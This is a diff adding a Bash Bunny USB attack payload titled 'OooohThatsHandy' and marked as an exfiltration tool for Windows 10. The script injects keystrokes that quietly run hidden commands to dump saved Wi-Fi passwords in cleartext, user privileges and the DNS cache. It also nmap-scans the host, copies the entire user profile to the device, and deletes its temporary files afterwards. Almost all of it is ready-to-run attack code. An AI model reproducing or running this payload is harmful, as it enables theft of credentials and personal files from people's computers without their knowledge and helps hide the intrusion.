@@ -1,0 +1,57 @@
+REM Title:         		OooohThatsHandy
+REM Description:   		Extract useful information such as nmap, wifi keys, DNS Cache, User privilieges and group memberships, user folder contents with images etc
+REM OS:			   		Designed for Win 10
+REM Author:        		Twitter @PeteDavis91
+REM Version:       		0.4
+REM Category:      		Exfiltration
+REM Attackmodes:   		HID Storage RNDIS_ETHERNET
+REM Credz:		   		Hak5 Darren obviously, 0iphori3 and Cribbit 
+
+
+REM LED CODES:
+REM SOLID BLUE LED:			Setting Up
+REM FAST BLUE LED: 			Creating Data
+REM VERY FAST BLUE LED:		Exporting Data Created and Discovered
+REM SOLID WHITE LED:		Cleaning up and finalizing
+REM FINISH GREEN LED: 		Safe to remove your Bash Bunny - Enjoy the data 
+
+REM This section sets up the BashBunny
+LED B SOLID
+Q DELAY 1000
+DUCKY_LANG gb
+ATTACKMODE HID STORAGE RNDIS_ETHERNET
+Q DELAY 1000
+GET TARGET_IP
+Q DELAY 500
+
+REM This section runs commands to create logs and data for export
+LED B FAST
+Q DELAY 500
+mkdir /root/hostsideloot
+Q DELAY 1000
+nmap -sC -O -F $TARGET_IP >> /root/hostsideloot/1.txt
+Q DELAY 1000
+RUN WIN 'cmd /minimized /c mkdir %TEMP%\LOOK && netsh wlan show profile * key=clear > %TEMP%\LOOK\2.txt & whoami /all > %TEMP%\LOOK\3.txt'
+Q DELAY 1000
+RUN WIN 'cmd /minimized /c ipconfig /displaydns > %TEMP%\LOOK\4.txt & dsregcmd /status > %TEMP%\LOOK\5.txt' 
+Q DELAY 750
+
+
+REM This section exports the previously created data as well as the running user profile with images and documents 
+LED B VERYFAST
+Q DELAY 50
+RUN WIN "powershell -W Hidden -c \$destination = ((gwmi win32_volume -f '\"label=''BashBunny'''\").Name); robocopy \$env:TEMP\\LOOK \$destination\\loot\\"
+Q DELAY 1000
+RUN WIN "powershell -W Hidden -c \$destination = ((gwmi win32_volume -f '\"label=''BashBunny'''\").Name); robocopy \$env:USERPROFILE \$destination\\loot\\"
+Q DELAY 1000
+mv /root/hostsideloot/1.txt /root/udisk/loot/
+
+REM Cleanup and finalizing
+LED W SOLID
+RUN WIN 'cmd /c rmdir /s /q %TEMP%\LOOK' 
+rmdir /root/hostsideloot
+
+
+ATTACKMODE FINISH
+LED G FINISH 
+
